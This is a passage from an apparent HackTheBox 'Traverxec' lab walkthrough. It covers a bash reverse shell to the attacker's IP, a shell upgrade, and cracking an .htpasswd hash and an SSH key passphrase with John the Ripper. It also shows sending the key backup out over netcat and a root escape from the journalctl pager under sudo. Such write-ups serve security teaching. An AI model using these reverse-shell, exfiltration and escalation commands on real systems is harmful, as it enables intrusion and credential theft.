</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>hostname <span class=o>&amp;&amp;</span> ip a
</span></span><span class=line><span class=cl>traverxec
</span></span><span class=line><span class=cl>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class=m>65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=m>1000</span>
</span></span><span class=line><span class=cl>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class=line><span class=cl>    inet 127.0.0.1/8 scope host lo
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=m>1500</span> qdisc pfifo_fast state UNKNOWN group default qlen <span class=m>1000</span>
</span></span><span class=line><span class=cl>    link/ether 00:50:56:b9:a0:f8 brd ff:ff:ff:ff:ff:ff
</span></span><span class=line><span class=cl>    inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><h4 id=shell-upgrade>Shell Upgrade<a class=anchor aria-hidden=true href=#shell-upgrade>#</a></h4><p>I will create another interactive shell session so I can upgrade my shell with the PTY trick.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>which bash
</span></span><span class=line><span class=cl>/usr/bin/bash
</span></span><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.34/53 0&gt;&amp;1&#34;</span> <span class=p>&amp;</span>
</span></span></code></pre></div><p>On my new session:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.34<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.165<span class=o>]</span> <span class=m>52718</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>421<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@traverxec:/usr/bin$ script /dev/null -c bash 
</span></span><span class=line><span class=cl>script /dev/null -c bash
</span></span><span class=line><span class=cl>Script started, file is /dev/null
</span></span><span class=line><span class=cl>www-data@traverxec:/usr/bin$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>www-data@traverxec:/usr/bin$ ^Z
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>3835</span> suspended  nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ stty raw -echo<span class=p>;</span><span class=nb>fg</span>     
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>3835</span> continued  nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@traverxec:/usr/bin$ stty cols <span class=m>127</span> rows <span class=m>30</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-david>Shell as david<a class=anchor aria-hidden=true href=#shell-as-david>#</a></h3><h4 id=nostromo-config>Nostromo config<a class=anchor aria-hidden=true href=#nostromo-config>#</a></h4><p>The <code>nostromo</code> config file under <code>/var/nostromo/conf</code> reveals that there is a <code>.htpasswd</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
</span></span><span class=line><span class=cl><span class=c1># MAIN [MANDATORY]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>servername              traverxec.htb
</span></span><span class=line><span class=cl>serverlisten            *
</span></span><span class=line><span class=cl>serveradmin             david@traverxec.htb
</span></span><span class=line><span class=cl>serverroot              /var/nostromo
</span></span><span class=line><span class=cl>servermimes             conf/mimes
</span></span><span class=line><span class=cl>docroot                 /var/nostromo/htdocs
</span></span><span class=line><span class=cl>docindex                index.html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># LOGS [OPTIONAL]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>logpid                  logs/nhttpd.pid
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># SETUID [RECOMMENDED]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>user                    www-data
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># BASIC AUTHENTICATION [OPTIONAL]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>htaccess                .htaccess
</span></span><span class=line><span class=cl>htpasswd                /var/nostromo/conf/.htpasswd
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ALIASES [OPTIONAL]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/icons                  /var/nostromo/icons
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># HOMEDIRS [OPTIONAL]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>homedirs                /home
</span></span><span class=line><span class=cl>homedirs_public         public_www
</span></span></code></pre></div><p>This<code>.htpasswd</code> file contains a password hash for user david.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
</span></span><span class=line><span class=cl>david:<span class=nv>$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/
</span></span><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ cat /etc/passwd <span class=p>|</span> grep sh <span class=o>&amp;&amp;</span> ls -l /home
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>david:x:1000:1000:david,,,:/home/david:/bin/bash
</span></span><span class=line><span class=cl>total <span class=m>4</span>
</span></span><span class=line><span class=cl>drwx--x--x <span class=m>6</span> david david <span class=m>4096</span> Jul <span class=m>13</span> 06:57 david
</span></span></code></pre></div><h4 id=password-cracking>Password Cracking<a class=anchor aria-hidden=true href=#password-cracking>#</a></h4><p><code>JtR</code> can recover the password easily.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./john.exe hashes/traverxec-david.hash --wordlist<span class=o>=</span>C:/tools/rockyou.txt                                  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>md5crypt, crypt<span class=o>(</span>3<span class=o>)</span> <span class=nv>$1</span>$ <span class=o>(</span>and variants<span class=o>)</span> <span class=o>[</span>MD5 256/256 AVX2 8x3<span class=o>])</span>
</span></span><span class=line><span class=cl>Will run <span class=m>8</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>Nowonly4me       <span class=o>(</span>david<span class=o>)</span>
</span></span><span class=line><span class=cl>1g 0:00:00:43 DONE <span class=o>(</span>2021-07-14 03:44<span class=o>)</span> 0.02307g/s 244113p/s 244113c/s 244113C/s NuiKo910..Noury
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>But turns out it&rsquo;s not a reused password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ su david
</span></span><span class=line><span class=cl>Password: 
</span></span><span class=line><span class=cl>su: Authentication failure
</span></span><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ 
</span></span></code></pre></div><h4 id=path-traversal---david-home-directory>Path Traversal - David home directory<a class=anchor aria-hidden=true href=#path-traversal---david-home-directory>#</a></h4><p>The david home directory is not readable by others, but it allows execute permissions. With that, I can determine what files all are available under david&rsquo;s home directory by spamming one character and leverage the tab completion. This is one of the benefits of doing a shell upgrade!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/
</span></span><span class=line><span class=cl>ls: cannot open directory <span class=s1>&#39;/home/david/&#39;</span>: Permission denied
</span></span><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/
</span></span><span class=line><span class=cl>drwx--x--x <span class=m>6</span> david david <span class=m>4096</span> Jul <span class=m>13</span> 06:57 /home/david/
</span></span><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/.ssh
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> david david <span class=m>4096</span> Oct <span class=m>25</span>  <span class=m>2019</span> /home/david/.ssh
</span></span><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/user.txt
</span></span><span class=line><span class=cl>-r--r----- <span class=m>1</span> root david <span class=m>33</span> Oct <span class=m>25</span>  <span class=m>2019</span> /home/david/user.txt
</span></span></code></pre></div><p>Then, when I type <code>public_www</code> (from nostromo config), the tab completion confirms that the folder is there. With <code>r-x</code>, I can use <code>ls -lR</code> command to list all the available contents recursively.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/public_www
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> david david <span class=m>4096</span> Oct <span class=m>25</span>  <span class=m>2019</span> /home/david/public_www
</span></span><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ ls -lR /home/david/public_www
</span></span><span class=line><span class=cl>/home/david/public_www:
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> david david  <span class=m>402</span> Oct <span class=m>25</span>  <span class=m>2019</span> index.html
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> david david <span class=m>4096</span> Oct <span class=m>25</span>  <span class=m>2019</span> protected-file-area
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/home/david/public_www/protected-file-area:
</span></span><span class=line><span class=cl>total <span class=m>4</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> david david <span class=m>1915</span> Oct <span class=m>25</span>  <span class=m>2019</span> backup-ssh-identity-files.tgz
</span></span></code></pre></div><p>The <code>backup-ssh-identity-files.tgz</code> seems interesting, I will grab that to my Kali.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@traverxec:/var/nostromo/conf$ cat /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz <span class=p>|</span> nc 10.10.14.34 <span class=m>53</span>
</span></span></code></pre></div><p>On my Kali:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>53</span> &gt; loot/backup-ssh-identity-files.tgz
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.34<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.165<span class=o>]</span> <span class=m>52728</span>
</span></span></code></pre></div><h4 id=passphrase-crack>Passphrase crack<a class=anchor aria-hidden=true href=#passphrase-crack>#</a></h4><p>The backup file contains a set of SSH keys.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «loot» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ tar -xvf backup-ssh-identity-files.tgz 
</span></span><span class=line><span class=cl>home/david/.ssh/
</span></span><span class=line><span class=cl>home/david/.ssh/authorized_keys
</span></span><span class=line><span class=cl>home/david/.ssh/id_rsa
</span></span><span class=line><span class=cl>home/david/.ssh/id_rsa.pub
</span></span></code></pre></div><p>But, it is protected with a passphrase.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «ssh-keys» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ ssh -i id_rsa david@traverxec.htb 
</span></span><span class=line><span class=cl>Enter passphrase <span class=k>for</span> key <span class=s1>&#39;id_rsa&#39;</span>: 
</span></span><span class=line><span class=cl>david@traverxec.htb<span class=err>&#39;</span>s password:
</span></span></code></pre></div><p>So I will convert the key to crackable format hash using <code>ssh2john</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /usr/share/john/ssh2john.py id_rsa &gt; david_rsa.hash 
</span></span><span class=line><span class=cl>→ kali@kali «ssh-keys» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ cat david_rsa.hash 
</span></span><span class=line><span class=cl>id_rsa:<span class=nv>$sshng$1$16$477</span>EEFFBA56F9D283D349033D5D08C4F<span class=nv>$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672</span>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p><code>JtR</code> recovers the passphrase to <code>hunter</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./john.exe hashes/traverxec-david-rsa.hash --wordlist<span class=o>=</span>C:/tools/rockyou.txt                    
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>SSH <span class=o>[</span>RSA/DSA/EC/OPENSSH <span class=o>(</span>SSH private keys<span class=o>)</span> 32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>KDF/cipher <span class=o>[</span><span class=nv>0</span><span class=o>=</span>MD5/AES <span class=nv>1</span><span class=o>=</span>MD5/3DES <span class=nv>2</span><span class=o>=</span>Bcrypt/AES<span class=o>])</span> is <span class=m>0</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>2</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>1</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>8</span> OpenMP threads
</span></span><span class=line><span class=cl>Note: This format may emit <span class=nb>false</span> positives, so it will keep trying even after
</span></span><span class=line><span class=cl>finding a possible candidate.
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>hunter           <span class=o>(</span>id_rsa<span class=o>)</span>
</span></span></code></pre></div><h4 id=ssh---david>SSH - david<a class=anchor aria-hidden=true href=#ssh---david>#</a></h4><p>The key and the passphrase are work for user david.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ ssh -i ssh-keys/david_rsa david@traverxec.htb
</span></span><span class=line><span class=cl>Enter passphrase <span class=k>for</span> key <span class=s1>&#39;ssh-keys/david_rsa&#39;</span>: 
</span></span><span class=line><span class=cl>Linux traverxec 4.19.0-6-amd64 <span class=c1>#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
</span></span><span class=line><span class=cl>Last login: Tue Jul <span class=m>13</span> 06:54:56 <span class=m>2021</span> from 10.10.16.7
</span></span><span class=line><span class=cl>david@traverxec:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,25<span class=o>(</span>floppy<span class=o>)</span>,29<span class=o>(</span>audio<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,44<span class=o>(</span>video<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,109<span class=o>(</span>netdev<span class=o>)</span>
</span></span></code></pre></div><p>User flag is done here</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@traverxec:~$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>60</span>
</span></span><span class=line><span class=cl>drwx--x--x <span class=m>6</span> david david  <span class=m>4096</span> Jul <span class=m>13</span> 06:57 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root  root   <span class=m>4096</span> Oct <span class=m>25</span>  <span class=m>2019</span> ..
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> david david <span class=m>18992</span> Jul <span class=m>13</span> 05:43 <span class=m>47163</span>
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root  root      <span class=m>9</span> Oct <span class=m>25</span>  <span class=m>2019</span> .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> david david   <span class=m>220</span> Oct <span class=m>25</span>  <span class=m>2019</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> david david  <span class=m>3544</span> Jul <span class=m>13</span> 06:57 .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> david david  <span class=m>4096</span> Oct <span class=m>25</span>  <span class=m>2019</span> bin
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> david david  <span class=m>4096</span> Jul <span class=m>13</span> 06:56 .local
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> david david   <span class=m>807</span> Oct <span class=m>25</span>  <span class=m>2019</span> .profile
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> david david  <span class=m>4096</span> Oct <span class=m>25</span>  <span class=m>2019</span> public_www
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> david david  <span class=m>4096</span> Oct <span class=m>25</span>  <span class=m>2019</span> .ssh
</span></span><span class=line><span class=cl>-r--r----- <span class=m>1</span> root  david    <span class=m>33</span> Oct <span class=m>25</span>  <span class=m>2019</span> user.txt
</span></span><span class=line><span class=cl>david@traverxec:~$ cat user.txt 
</span></span><span class=line><span class=cl>7db0...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>In david&rsquo;s home directory, there is a folder called <code>bin</code>. Under this <code>bin</code> folder, there is a bash script.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@traverxec:~$ ls -l bin/
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>-r-------- <span class=m>1</span> david david <span class=m>802</span> Oct <span class=m>25</span>  <span class=m>2019</span> server-stats.head
</span></span><span class=line><span class=cl>-rwx------ <span class=m>1</span> david david <span class=m>363</span> Oct <span class=m>25</span>  <span class=m>2019</span> server-stats.sh
</span></span></code></pre></div><p>When I run the script, I get the following results:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@traverxec:~/bin$ ./server-stats.sh 
</span></span><span class=line><span class=cl>                                                                          .----.
</span></span><span class=line><span class=cl>                                                              .---------. <span class=p>|</span> <span class=o>==</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>   Webserver Statistics and Data                              <span class=p>|</span>.-<span class=s2>&#34;&#34;&#34;&#34;&#34;-.| |----|
</span></span></span><span class=line><span class=cl><span class=s2>         Collection Script                                    ||       || | == |
</span></span></span><span class=line><span class=cl><span class=s2>          (c) David, 2019                                     ||       || |----|
</span></span></span><span class=line><span class=cl><span class=s2>                                                              |&#39;-.....-&#39;| |::::|
</span></span></span><span class=line><span class=cl><span class=s2>                                                              &#39;&#34;&#34;)---(&#34;&#34;&#39; |___.|
</span></span></span><span class=line><span class=cl><span class=s2>                                                             /:::::::::::\&#34;    &#34;</span>
</span></span><span class=line><span class=cl>                                                            /:::<span class=o>=======</span>:::<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>                                                        jgs <span class=s1>&#39;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#39;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Load:  18:24:49 up 17:04,  <span class=m>1</span> user,  load average: 0.13, 0.04, 0.01
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>Open nhttpd sockets: <span class=m>0</span>
</span></span><span class=line><span class=cl>Files in the docroot: <span class=m>117</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>Last <span class=m>5</span> journal log lines:
</span></span><span class=line><span class=cl>-- Logs begin at Tue 2021-07-13 01:20:43 EDT, end at Tue 2021-07-13 18:24:49 EDT. --
</span></span><span class=line><span class=cl>Jul <span class=m>13</span> 17:16:02 traverxec sudo<span class=o>[</span>24501<span class=o>]</span>: pam_unix<span class=o>(</span>sudo:auth<span class=o>)</span>: authentication failure<span class=p>;</span> <span class=nv>logname</span><span class=o>=</span> <span class=nv>uid</span><span class=o>=</span><span class=m>33</span> <span class=nv>euid</span><span class=o>=</span><span class=m>0</span> <span class=nv>tty</span><span class=o>=</span>/dev/pts/0 <span class=nv>ruser</span><span class=o>=</span>www-data <span class=nv>rhost</span><span class=o>=</span>  <span class=nv>user</span><span class=o>=</span>www-data
</span></span><span class=line><span class=cl>Jul <span class=m>13</span> 17:16:04 traverxec sudo<span class=o>[</span>24501<span class=o>]</span>: pam_unix<span class=o>(</span>sudo:auth<span class=o>)</span>: conversation failed
</span></span><span class=line><span class=cl>Jul <span class=m>13</span> 17:16:04 traverxec sudo<span class=o>[</span>24501<span class=o>]</span>: pam_unix<span class=o>(</span>sudo:auth<span class=o>)</span>: auth could not identify password <span class=k>for</span> <span class=o>[</span>www-data<span class=o>]</span>
</span></span><span class=line><span class=cl>Jul <span class=m>13</span> 17:16:04 traverxec sudo<span class=o>[</span>24501<span class=o>]</span>: www-data : <span class=nb>command</span> not allowed <span class=p>;</span> <span class=nv>TTY</span><span class=o>=</span>pts/0 <span class=p>;</span> <span class=nv>PWD</span><span class=o>=</span>/dev/shm <span class=p>;</span> <span class=nv>USER</span><span class=o>=</span>root <span class=p>;</span> <span class=nv>COMMAND</span><span class=o>=</span>list
</span></span><span class=line><span class=cl>Jul <span class=m>13</span> 17:16:04 traverxec nologin<span class=o>[</span>24564<span class=o>]</span>: Attempted login by UNKNOWN on UNKNOWN
</span></span></code></pre></div><h4 id=sudo-journalctl>Sudo journalctl<a class=anchor aria-hidden=true href=#sudo-journalctl>#</a></h4><p>Based on the contents of <code>server-stats.sh</code>, user <code>david</code> seems to be allowed to run <code>journalctl</code> with sudo.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@traverxec:~/bin$ cat server-stats.sh 
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cat /home/david/bin/server-stats.head
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Load: `/usr/bin/uptime`&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Last 5 journal log lines:&#34;</span>
</span></span><span class=line><span class=cl>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service <span class=p>|</span> /usr/bin/cat 
</span></span></code></pre></div><p>But, when I run <code>/usr/bin/sudo /usr/bin/journalctl</code>, it asks for a password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> david: 
</span></span><span class=line><span class=cl>Sorry, try again.
</span></span></code></pre></div><p>Then, I grab this line <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> and run it. This is what I get:</p><p><div class=img-container><img src=imgs/image-20210714052617836.png alt=image-20210714052617836></div></p><p>That means I can run the following command with sudo.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
</span></span></code></pre></div><p>According to the <a href=https://gtfobins.github.io/gtfobins/journalctl/>GTFOBins</a>, the default pager of <code>journalctl</code> is <code>less</code>. Now since it runs with root privilege, I can escape from the pager using <code>!/bin/bash</code>.</p><p><div class=img-container><img src=imgs/image-20210714054042963.png alt=image-20210714054042963></div></p><div class=post-references><h2>References</h2><ul><li><a href=https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec/ target=_blank rel="noopener noreferrer">https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec/</a></li><li><a href=https://gtfobins.github.io/gtfobins/journalctl/ target=_blank rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/journalctl/</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/nostromo/>Nostromo</a></li><li><a href=https://fahmifj.github.io/tags/command-injection/>Command-injection</a></li><li><a href=https://fahmifj.github.io/tags/metasploit/>Metasploit</a></li><li><a href=https://fahmifj.github.io/tags/path-traversal/>Path-traversal</a></li><li><a href=https://fahmifj.github.io/tags/sudo/>sudo</a></li><li><a href=https://fahmifj.github.io/tags/journalctl/>journalctl</a></li><li><a href=https://fahmifj.github.io/tags/gtfobins/>GTFOBins</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Traverxec on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Traverxec&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftraverxec%2f&hashtags=Linux%2cNostromo%2cCommand-injection%2cmetasploit%2cPath-traversal%2csudo%2cjournalctl%2cGTFObins"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Traverxec on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftraverxec%2f&title=HackTheBox%20-%20Traverxec&summary=HackTheBox%20-%20Traverxec&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftraverxec%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 